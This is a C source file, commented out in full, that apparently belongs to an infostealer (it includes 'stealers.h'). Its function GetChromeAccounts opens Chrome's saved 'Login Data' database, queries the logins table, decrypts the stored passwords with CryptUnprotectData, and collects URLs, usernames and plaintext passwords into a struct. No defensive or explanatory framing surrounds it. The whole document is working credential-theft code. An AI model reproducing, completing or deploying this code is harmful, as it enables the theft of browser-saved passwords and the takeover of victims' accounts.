// #include "stealers.h"
// 
// ChromeAccounts* GetChromeAccounts(void)
// {
// 
// 	tsqlite3_open16 psqlite3_open16;
// 	tsqlite3_prepare_v2 psqlite3_prepare_v2;
// 	tsqlite3_step psqlite3_step;
// 	tsqlite3_column_blob psqlite3_column_blob;
// 	tsqlite3_column_bytes psqlite3_column_bytes;
// 	tsqlite3_column_text psqlite3_column_text;
// 	//TODO:
// 	//SQLite Reading Chrome Database + Grab URL+Username+Password and fill struct. Done.
// 	//Test the function. TODO
// 	sqlite3 *lpDatabase;
// 	sqlite3_stmt *lpStatement;
// 	DATA_BLOB DataIn, DataOut;
// 	LPSTR lpTail;
// 	ChromeAccounts* Chrome;
// 	int i;
// 	LPWSTR ChromeData = GetFolderPath(CSIDL_LOCAL_APPDATA);
// 
// 	Chrome = (ChromeAccounts*)memalloc(sizeof(ChromeAccounts));	
// 	hSqlite = LoadLibraryA("sqlite3.dll");
// 	psqlite3_open16 = (tsqlite3_open16)GetProcAddress(hSqlite, "sqlite3_open16");
// 	psqlite3_prepare_v2 = (tsqlite3_prepare_v2)GetProcAddress(hSqlite, "sqlite3_prepare_v2");
// 	psqlite3_step = (tsqlite3_step)GetProcAddress(hSqlite, "sqlite3_step");
// 	psqlite3_column_blob = (tsqlite3_column_blob)GetProcAddress(hSqlite, "sqlite3_column_blob");
// 	psqlite3_column_bytes = (tsqlite3_column_bytes)GetProcAddress(hSqlite, "sqlite3_column_bytes");
// 	psqlite3_column_text = (tsqlite3_column_text)GetProcAddress(hSqlite, "sqlite3_column_text");
// 
// 	
// 	lstrcatW(ChromeData, L"Google\\Chrome\\User Data\\Default\\Login Data");
// 	if(GetFileAttributesW(ChromeData) != 0xFFFFFFFF) 
// 	{
// 		psqlite3_open16(ChromeData, &lpDatabase);
// 		psqlite3_prepare_v2(lpDatabase, "SELECT * FROM logins", 20, &lpStatement, &lpTail);	
// 		for(i = 0; psqlite3_step(lpStatement) == SQLITE_ROW; i++)
// 		{
// 			Chrome->Accounts[i] = (RecAccount*)memalloc(sizeof(RecAccount));
// 			DataIn.pbData = (LPBYTE)psqlite3_column_blob(lpStatement, 5);
// 			DataIn.cbData = psqlite3_column_bytes(lpStatement, 5);
// 			if(CryptUnprotectData(&DataIn, 0, 0, 0, 0, 8, &DataOut)) {
// 				Chrome->Accounts[i]->URL = (char*)psqlite3_column_text(lpStatement, 0);
// 				Chrome->Accounts[i]->Username = (char*)psqlite3_column_text(lpStatement, 3);
// 				Chrome->Accounts[i]->Password = (char*)DataOut.pbData;
// 				Chrome->Accounts[i]->Password[DataOut.cbData] = '\0';
// 				Chrome->Accounts[i]->Application = "Google Chrome";
// 			}
// 		}
// 	}
// 	return Chrome;
// }